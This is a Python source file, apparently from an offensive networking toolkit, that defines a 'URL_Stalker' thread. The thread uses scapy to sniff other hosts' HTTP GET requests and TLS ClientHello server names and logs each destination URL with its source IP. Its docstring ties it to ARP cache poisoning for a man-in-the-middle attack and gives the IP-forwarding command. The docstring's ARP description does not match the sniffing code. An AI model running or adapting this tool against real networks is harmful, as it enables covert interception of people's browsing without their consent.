import threading
from scapy.all import *
from scapy.layers.tls.all import * #dunno why scapy doesnt import this by default
from urllib.request import unquote

from src import packet_utilities
from src.log import log


class URL_Stalker(threading.Thread):
    """Thread of the URL Stalking module.
    
    Sends ARP packets to a target in order to poison its cache. This way a
    MiTM attack can be performed, or the target can be disconnected.
    
    IP Forwarding needed:
        echo 1 > /proc/sys/net/ipv4/ip_forward
    """
    
    def __init__(self, exit_event, timeout):
        """Creates the thread.
        
        Parameters:
            exit_event (threading.Event): the event that will be checked to
                finish the thread and so the URL Stalking.
            timeout (int, None): the time in seconds of the duration of the
                attack. If None, it will last until CTRL-C is pressed.
            As a Thread, it can also have any of a thread parameters. See
            help(threading.Thread) for more help.
        """
        super().__init__()
        self.exit_event = exit_event
        self.timeout=timeout
        
        
    def _handle_packet(self, packet):
        """Handles every http or https packet, and shows the URL it is sent to.
        
        Parameters:
            packet (scapy.packet.Packet): handled packet.
        """
        
        if packet["TCP"].dport == 80:
            load = packet.load.decode("utf-8", "ignore")
            url = packet_utilities.get_host(load) + packet_utilities.get_subhost(load)
            log.urlstalker.info("http", url=url, src=packet["IP"].src)
        elif packet["TCP"].dport == 443:
            #print("httpS packet received")
            log.urlstalker.info("https", url=packet["TLS_Ext_ServerName"].servernames[0].servername.decode("utf-8","ignore"), src=packet["IP"].src)
        else:
            print("unknown packet received:")
            packet.summary()
            
        
    def run(self):
        """Method representing the thread's activity. It is started when start
        function is called.
        
        Sniffes every http or https sent packet and shows its URL destination.
        """
        
        log.urlstalker.info("start",timeout=self.timeout)
        
        sniff(filter="tcp and (dst port 80 or dst port 443)",
              lfilter=lambda x: (x.haslayer("Raw") and b"GET" in x["Raw"].load) or (x.haslayer("TLSClientHello")), 
              prn=self._handle_packet, store=False, stopperTimeout=3, stopper=self.exit_event.is_set, timeout=self.timeout)
              
        log.urlstalker.info("finish")
        
